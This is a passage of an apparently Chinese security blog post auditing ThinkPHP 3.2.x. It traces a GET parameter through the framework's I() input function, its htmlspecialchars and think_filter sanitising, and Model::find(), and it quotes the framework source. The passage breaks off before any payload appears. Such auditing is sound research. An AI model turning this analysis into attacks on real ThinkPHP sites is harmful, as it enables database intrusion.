id="配置"><a href="#配置" class="headerlink" title="配置"></a><strong>配置</strong></h4><p>首先配置好数据库 <code>ThinkPHP/Conf/convention.php</code></p><p><img src="/mdimg/thinkphp23/1745137191070-f41ae7bd-778d-48fe-ae1b-e38c3974ed4c.png"></p><p>在Application/Home/Controller/IndexController.class.php写一个获取数据库数据的控制器</p><p><img src="/mdimg/thinkphp23/1745137144841-f596e857-85f8-4afc-8b1b-c1c6cd8947a0.png"></p><p>访问试一下</p><p><img src="/mdimg/thinkphp23/1745137147053-2f4ceff9-9007-4868-86c4-4f964279e499.png"></p><h4 id="审计"><a href="#审计" class="headerlink" title="审计"></a><strong>审计</strong></h4><p>对于传入的<code>id=1</code>，根据</p><p><code>$data = M(&#39;user&#39;)-&gt;find(I(&#39;GET.id&#39;));</code></p><p>由内到外分析参数经过的方法</p><p>首先是<code>I()</code>方法，ctrl+单击方法跳转到<code>ThinkPHP/Common/functions.php:271</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取输入参数 支持过滤和默认值</span><br><span class="hljs-comment"> * 使用方法:</span><br><span class="hljs-comment"> * &lt;code&gt;</span><br><span class="hljs-comment"> * I(&#x27;id&#x27;,0); 获取id参数 自动判断get或者post</span><br><span class="hljs-comment"> * I(&#x27;post.name&#x27;,&#x27;&#x27;,&#x27;htmlspecialchars&#x27;); 获取$_POST[&#x27;name&#x27;]</span><br><span class="hljs-comment"> * I(&#x27;get.&#x27;); 获取$_GET</span><br><span class="hljs-comment"> * &lt;/code&gt;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> string $name 变量的名称 支持指定类型</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $default 不存在的时候默认值</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $filter 参数过滤方法</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $datas 要获取的额外数据源</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> mixed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">I</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$default</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filter</span>=<span class="hljs-literal">null</span>,<span class="hljs-variable">$datas</span>=<span class="hljs-literal">null</span></span>) </span>&#123;<br>    <span class="hljs-built_in">static</span> <span class="hljs-variable">$_PUT</span>   =  <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&#x27;/&#x27;</span>))&#123; <span class="hljs-comment">// 指定修饰符</span><br>       <span class="hljs-keyword">list</span>(<span class="hljs-variable">$name</span>,<span class="hljs-variable">$type</span>)  =  <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-variable">$name</span>,<span class="hljs-number">2</span>);<br>    &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">C</span>(<span class="hljs-string">&#x27;VAR_AUTO_STRING&#x27;</span>))&#123; <span class="hljs-comment">// 默认强制转换为字符串</span><br>        <span class="hljs-variable">$type</span>   =   <span class="hljs-string">&#x27;s&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&#x27;.&#x27;</span>)) &#123; <span class="hljs-comment">// 指定参数来源</span><br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$method</span>,<span class="hljs-variable">$name</span>) =   <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$name</span>,<span class="hljs-number">2</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123; <span class="hljs-comment">// 默认为自动判断</span><br>        <span class="hljs-variable">$method</span> =   <span class="hljs-string">&#x27;param&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">switch</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$method</span>)) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;get&#x27;</span>     :   <br>            <span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$_GET</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;post&#x27;</span>    :   <br>            <span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$_POST</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;put&#x27;</span>     :   <br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$_PUT</span>))&#123;<br>                <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>), <span class="hljs-variable">$_PUT</span>);<br>            &#125;<br>            <span class="hljs-variable">$input</span>     =  <span class="hljs-variable">$_PUT</span>;        <br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;param&#x27;</span>   :<br>            <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;POST&#x27;</span>:<br>                    <span class="hljs-variable">$input</span>  =  <span class="hljs-variable">$_POST</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;PUT&#x27;</span>:<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$_PUT</span>))&#123;<br>                        <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>), <span class="hljs-variable">$_PUT</span>);<br>                    &#125;<br>                    <span class="hljs-variable">$input</span>     =  <span class="hljs-variable">$_PUT</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-variable">$input</span>  =  <span class="hljs-variable">$_GET</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;path&#x27;</span>    :   <br>            <span class="hljs-variable">$input</span>  =   <span class="hljs-keyword">array</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>]))&#123;<br>                <span class="hljs-variable">$depr</span>   =   <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-string">&#x27;URL_PATHINFO_DEPR&#x27;</span>);<br>                <span class="hljs-variable">$input</span>  =   <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-variable">$depr</span>,<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>],<span class="hljs-variable">$depr</span>));            <br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;request&#x27;</span> :   <br>            <span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$_REQUEST</span>;   <br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;session&#x27;</span> :   <br>            <span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$_SESSION</span>;   <br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;cookie&#x27;</span>  :   <br>            <span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$_COOKIE</span>;    <br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;server&#x27;</span>  :   <br>            <span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$_SERVER</span>;    <br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;globals&#x27;</span> :   <br>            <span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$GLOBALS</span>;    <br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;data&#x27;</span>    :   <br>            <span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$datas</span>;      <br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-variable">$name</span>) &#123; <span class="hljs-comment">// 获取全部变量</span><br>        <span class="hljs-variable">$data</span>       =   <span class="hljs-variable">$input</span>;<br>        <span class="hljs-variable">$filters</span>    =   <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filter</span>)?<span class="hljs-variable">$filter</span>:<span class="hljs-title function_ invoke__">C</span>(<span class="hljs-string">&#x27;DEFAULT_FILTER&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filters</span>) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$filters</span>))&#123;<br>                <span class="hljs-variable">$filters</span>    =   <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$filters</span>);<br>            &#125;<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$filters</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>)&#123;<br>                <span class="hljs-variable">$data</span>   =   <span class="hljs-title function_ invoke__">array_map_recursive</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$data</span>); <span class="hljs-comment">// 参数过滤</span><br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>[<span class="hljs-variable">$name</span>])) &#123; <span class="hljs-comment">// 取值操作</span><br>        <span class="hljs-variable">$data</span>       =   <span class="hljs-variable">$input</span>[<span class="hljs-variable">$name</span>];<br>        <span class="hljs-variable">$filters</span>    =   <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filter</span>)?<span class="hljs-variable">$filter</span>:<span class="hljs-title function_ invoke__">C</span>(<span class="hljs-string">&#x27;DEFAULT_FILTER&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filters</span>) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$filters</span>))&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-number">0</span> === <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filters</span>,<span class="hljs-string">&#x27;/&#x27;</span>))&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span> !== <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$filters</span>,(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$data</span>))&#123;<br>                        <span class="hljs-comment">// 支持正则验证</span><br>                        <span class="hljs-keyword">return</span>   <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$default</span>) ? <span class="hljs-variable">$default</span> : <span class="hljs-literal">null</span>;<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$filters</span>    =   <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$filters</span>);                    <br>                &#125;<br>            &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">is_int</span>(<span class="hljs-variable">$filters</span>))&#123;<br>                <span class="hljs-variable">$filters</span>    =   <span class="hljs-keyword">array</span>(<span class="hljs-variable">$filters</span>);<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$filters</span>))&#123;<br>                <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$filters</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>)&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-variable">$filter</span>)) &#123;<br>                        <span class="hljs-variable">$data</span>   =   <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>) ? <span class="hljs-title function_ invoke__">array_map_recursive</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$data</span>) : <span class="hljs-variable">$filter</span>(<span class="hljs-variable">$data</span>); <span class="hljs-comment">// 参数过滤</span><br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$data</span>   =   <span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$data</span>,<span class="hljs-title function_ invoke__">is_int</span>(<span class="hljs-variable">$filter</span>) ? <span class="hljs-variable">$filter</span> : <span class="hljs-title function_ invoke__">filter_id</span>(<span class="hljs-variable">$filter</span>));<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span> === <span class="hljs-variable">$data</span>) &#123;<br>                            <span class="hljs-keyword">return</span>   <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$default</span>) ? <span class="hljs-variable">$default</span> : <span class="hljs-literal">null</span>;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$type</span>))&#123;<br>            <span class="hljs-keyword">switch</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$type</span>))&#123;<br>               <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:  <span class="hljs-comment">// 数组</span><br>                  <span class="hljs-variable">$data</span>  =  (<span class="hljs-keyword">array</span>)<span class="hljs-variable">$data</span>;<br>                  <span class="hljs-keyword">break</span>;<br>               <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:  <span class="hljs-comment">// 数字</span><br>                  <span class="hljs-variable">$data</span>  =  (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$data</span>;<br>                  <span class="hljs-keyword">break</span>;<br>               <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;f&#x27;</span>:  <span class="hljs-comment">// 浮点</span><br>                  <span class="hljs-variable">$data</span>  =  (<span class="hljs-keyword">float</span>)<span class="hljs-variable">$data</span>;<br>                  <span class="hljs-keyword">break</span>;<br>               <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:  <span class="hljs-comment">// 布尔</span><br>                  <span class="hljs-variable">$data</span>  =  (<span class="hljs-keyword">boolean</span>)<span class="hljs-variable">$data</span>;<br>                  <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:   <span class="hljs-comment">// 字符串</span><br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-variable">$data</span>   =   (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$data</span>;<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123; <span class="hljs-comment">// 变量默认值</span><br>        <span class="hljs-variable">$data</span>       =    <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$default</span>)?<span class="hljs-variable">$default</span>:<span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>) &amp;&amp; <span class="hljs-title function_ invoke__">array_walk_recursive</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&#x27;think_filter&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在方法定义的地方下个断点，跟踪参数在方法中的路径</p><p>因为没有传入<code>filter</code>参数，所以默认为空</p><p><img src="/mdimg/thinkphp23/1745137199130-a2f3b746-113f-4aef-8648-6e3d3d12442a.png"></p><p>所以下面这个三元表达式会取<code>C(&#39;DEFAULT_FILTER&#39;)</code></p><p><code>$filters = isset($filter)?$filter:C(&#39;DEFAULT_FILTER&#39;); //C(&#39;DEFAULT_FILTER&#39;)</code></p><p>调用了<code>C</code>方法，跟进一下在<code>ThinkPHP/Common/functions.php:23</code></p><p>分析一下知道会到这个三元表达式</p><p><img src="/mdimg/thinkphp23/1745137174907-3376f5c7-e8c9-407d-9c04-11de884a858f.png"></p><p>查看配置文件</p><p><img src="/mdimg/thinkphp23/1745137188964-685b6882-91a1-48f1-9eb9-e3a87576c5b7.png"></p><p>用的<code>htmlspecialchars</code>，继续跟</p><p><img src="/mdimg/thinkphp23/1745137285317-5444fcaa-91a9-4ab0-93e4-3004ee5d4ac3.png"></p><p>这里分析不管传入的是不是数组，经过</p><p><code>$data = is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤</code></p><p>都会先调用<code>htmlspecialchars</code>来过滤</p><p>然后会到</p><p><code>is_array($data) &amp;&amp; array_walk_recursive($data,&#39;think_filter&#39;); //回调think_filter来过滤</code></p><p>在<code>ThinkPHP/Common/functions.php:1538</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">think_filter</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span></span>)</span>&#123;<br>    <span class="hljs-comment">// TODO 其他安全过滤</span><br><br>    <span class="hljs-comment">// 过滤查询特殊字符</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>,<span class="hljs-variable">$value</span>))&#123;<br>        <span class="hljs-variable">$value</span> .= <span class="hljs-string">&#x27; &#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后返回</p><p><img src="/mdimg/thinkphp23/1745137216483-846f21bd-8f09-4222-9dd8-940dadac29c0.png"></p><p>接着跟进<code>find()</code>方法<code>ThinkPHP/Library/Think/Model.class.php：720</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find</span>(<span class="hljs-params"><span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$options</span>) || <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$options</span>)) &#123;<br>        <span class="hljs-variable">$where</span>[<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getPk</span>()]  =   <span class="hljs-variable">$options</span>;<br>        <span class="hljs-variable">$options</span>                =   <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]       =   <span class="hljs-variable">$where</span>;<br>    &#125;<br>    <span class="hljs-comment">// 根据复合主键查找记录</span><br>    <span class="hljs-variable">$pk</span>  =  <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getPk</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$options</span>) &amp;&amp; (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$options</span>) &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$pk</span>)) &#123;<br>        <span class="hljs-comment">// 根据复合主键查询</span><br>        <span class="hljs-variable">$count</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$options</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_int</span>(<span class="hljs-variable">$key</span>)) <span class="hljs-variable">$count</span>++; <br>        &#125; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> == <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$pk</span>)) &#123;<br>            <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$pk</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$field</span>) &#123;<br>                <span class="hljs-variable">$where</span>[<span class="hljs-variable">$field</span>] = <span class="hljs-variable">$options</span>[<span class="hljs-variable">$i</span>];<br>                <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-variable">$i</span>++]);<br>            &#125;<br>            <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]  =  <span class="hljs-variable">$where</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 总是查找一条记录</span><br>    <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]   =   <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 分析表达式</span><br>    <span class="hljs-variable">$options</span>            =   <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">_parseOptions</span>(<span class="hljs-variable">$options</span>);<br>    <span class="hljs-comment">// 判断查询缓存</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;cache&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$cache</span>  =   <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;cache&#x27;</span>];<br>        <span class="hljs-variable">$key</span>    =   <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$cache</span>[<span class="hljs-string">&#x27;key&#x27;</span>])?<span class="hljs-variable">$cache</span>[<span class="hljs-string">&#x27;key&#x27;</span>]:<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$options</span>));<br>        <span class="hljs-variable">$data</span>   =   <span class="hljs-title function_ invoke__">S</span>(<span class="hljs-variable">$key</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$cache</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span> !== <span class="hljs-variable">$data</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;data     =   <span class="hljs-variable">$data</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$resultSet</span>          =   <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$options</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span> === <span class="hljs-variable">$resultSet</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$resultSet</span>)) &#123;<span class="hljs-comment">// 查询结果为空</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$resultSet</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$resultSet</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 读取数据后的处理</span><br>    <span class="hljs-variable">$data</span>   =   <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">_read_data</span>(<span class="hljs-variable">$resultSet</span>[<span 